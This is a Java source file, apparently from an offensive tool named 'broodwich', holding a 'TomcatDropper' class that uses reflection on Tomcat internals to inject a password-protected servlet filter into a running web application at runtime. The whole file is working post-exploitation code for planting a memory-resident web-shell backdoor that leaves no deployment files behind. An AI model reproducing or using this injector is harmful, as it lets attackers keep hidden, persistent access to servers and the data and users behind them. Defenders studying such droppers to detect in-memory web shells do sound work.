/*
 * Copyright (c) 2019 Brian D. Hysell
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */

package party.itistimeto.broodwich.droppers;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.DispatcherType;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;

public class TomcatDropper {
    public static void taste(String pattern, String password) {
        // TODO: this is for (some versions of?) tomcat, add spring, jetty, legacy servlet api (?), etc
        StandardContext standardContext = (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();

        if (!standardContext.getServletContext().getFilterRegistrations().containsKey(BroodwichFilter.filterName)) {
            try {
                // to add the filter, we need to use StandardContext's public methods addFilterDef and
                // addFilterMap, as well as manipulate its filterConfigs map directly; filter configs require
                // use of a protected constructor
                Constructor afcConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                afcConstructor.setAccessible(true);
                Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);

                // create filter definition
                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(BroodwichFilter.filterName);
                filterDef.setFilter(new BroodwichFilter(password));

                // create filter map
                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName(BroodwichFilter.filterName);
                filterMap.addURLPattern(pattern);
                // TODO: or should we use "upper" context?
                for(String servletName : standardContext.getServletContext().getServletRegistrations().keySet()) {
                    filterMap.addServletName(servletName);
                }
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                // create filter config
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) afcConstructor.newInstance(standardContext, filterDef);

                // add definition, map, and config, synchronized on context's config map
                // todo: will this lock requests on high-traffic server? hopefully light enough that it won't
                Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>) filterConfigsField.get(standardContext);
                synchronized (filterConfigsField.get(standardContext)) {
                    // TODO: do we need to use addFilterDef?
                    standardContext.addFilterDef(filterDef);
                    standardContext.addFilterMap(filterMap);
                    filterConfigs.put(BroodwichFilter.filterName, filterConfig);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
    }
    }
}
